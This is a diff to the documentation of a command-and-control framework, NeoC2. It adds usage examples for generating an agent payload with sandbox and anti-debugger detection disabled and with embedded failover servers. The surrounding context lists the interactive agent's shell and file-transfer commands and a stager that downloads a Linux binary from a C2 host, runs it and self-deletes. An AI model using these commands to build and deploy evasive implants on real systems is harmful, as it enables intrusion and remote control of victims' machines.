@@ -181,6 +181,22 @@ NeoC2 > payload phantom_hawk <listener_id> [--obfuscate] [--disable-sandbox] [--
 NeoC2 [INTERACTIVE:abc123] > [reverse_proxy_start, reverse_proxy_stop, cmd, pwsh, upload, download, tty_shell, sleep, kill, interact, run]
 ```
 
+#### Usage Examples
+
+**Default agent**
+```
+payload phantom_hawk_agent web_app_default
+```
+
+**Agent with disabled sandbox detection and anti-debuggers**
+```
+payload phantom_hawk_agent web_app_default --disable-sandbox
+```
+
+**Agent with embeded failover servers**
+```
+payload phantom_hawk_agent web_app_default --use-failover
+```
 
 ## Droppers
 
@@ -197,7 +213,7 @@ For seamless operation, use the `payload_upload` feature to stage payloads first
 - **Self-deletes** after execution
 - **Binary payload support**: Can only execute linux binary files after temporary storage
 ### Usage
-```
+``` 
 stager generate linux_binary host=<c2_host> port=<c2_port> [protocol=https] [download_uri=/api/assets/main.js]
 ```
 
